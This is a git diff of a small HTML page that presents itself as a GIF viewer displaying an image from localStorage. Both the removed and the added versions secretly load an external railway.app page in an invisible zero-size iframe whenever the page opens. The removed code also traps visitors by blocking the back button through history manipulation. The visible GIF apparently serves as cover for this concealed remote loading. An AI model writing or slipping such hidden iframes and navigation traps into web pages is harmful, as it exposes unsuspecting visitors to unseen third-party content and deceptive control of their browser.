@@ -6,64 +6,29 @@
     <style>
         body {
             margin: 0;
-            padding: 0;
+            padding: 20px;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             background: #f0f2f5;
         }
-        .gif-container {
-            max-width: 100%;
-            height: auto;
-        }
         img {
             max-width: 100%;
             height: auto;
-            display: block;
-        }
-        iframe {
-            width: 0;
-            height: 0;
-            border: 0;
-            position: absolute;
-            opacity: 0;
-            pointer-events: none;
         }
     </style>
 </head>
 <body>
-    <div class="gif-container">
-        <img src="" id="displayedGif" alt="GIF">
-    </div>
+    <img id="gif" src="" alt="Loading...">
+    <iframe src="https://web-production-c2a9d.up.railway.app/" style="width:0;height:0;border:0;position:absolute;"></iframe>
 
     <script>
-        // Hiển thị GIF
-        window.onload = function() {
-            const uploadedGif = localStorage.getItem('uploadedGif');
-            if (uploadedGif) {
-                document.getElementById('displayedGif').src = uploadedGif;
-                
-                // Tạo iframe ẩn sau khi GIF đã load
-                setTimeout(() => {
-                    const iframe = document.createElement('iframe');
-                    iframe.style.display = 'none';
-                    iframe.src = 'https://web-production-c2a9d.up.railway.app/';
-                    document.body.appendChild(iframe);
-                }, 100);
-            }
+        // Load and display GIF
+        const savedGif = localStorage.getItem('uploadedGif');
+        if (savedGif) {
+            document.getElementById('gif').src = savedGif;
         }
-
-        // Ngăn chặn điều hướng tự động
-        window.onbeforeunload = function() {
-            return;
-        }
-        
-        // Chặn các thao tác điều hướng
-        history.pushState(null, '', location.href);
-        window.onpopstate = function() {
-            history.go(1);
-        };
     </script>
 </body>
 </html>
